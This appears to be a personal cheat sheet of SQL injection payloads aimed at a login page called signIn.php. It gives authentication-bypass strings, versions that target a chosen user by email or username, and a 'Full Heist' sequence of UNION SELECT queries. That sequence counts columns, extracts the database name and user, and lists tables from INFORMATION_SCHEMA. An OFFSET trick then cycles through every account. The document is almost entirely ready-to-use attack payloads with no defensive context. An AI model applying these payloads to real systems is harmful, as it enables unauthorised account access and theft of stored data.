- Auth Bypass on signIn.php

  1. username => 'or '1'='1' -- '
  2. You can use this attack to get the first user, if you do not any username prior to your attempt.

- Auth Bypass with any field that may be publicly available

  1. username => 'or email='smb@gmail.com' -- '

- Auth a specific user by a known unique field
  username => 'or username='smb' -- '
  or
  username => 'or email='smb@gmail.com' -- '

* Full Heist

- Get number of fields returned

  1. username = fsdfs' UNION SELECT 1, 2, 3 -- '
  2. The fsdfs is just random text to make the username query fail, since fsdfs is most likely not a real username in the system
  3. Progressively increase the number of comma-separated values in the SELECT, until if doesn't fail

- Get DB name and DB user account

  1. username = fsdfs' UNION SELECT DATABASE(), user() -- '

- Get first table name, using DB name obtained above

  1. fsdfs' UNION SELECT table_name, 1 FROM INFORMATION_SCHEMA.tables WHERE table_schema='test' -- '

- Get all table names, using DB name obtained above

  1. fsdfs' UNION SELECT GROUP_CONCAT(table_name), 1 FROM INFORMATION_SCHEMA.tables WHERE table_schema='test' -- '

- Auth Bypass with any skipping through

  1. username => 'or '1'='1' LIMIT 1 OFFSET 2 -- '
  2. OFFSET is the key value here. This way, you can go through the whole table.
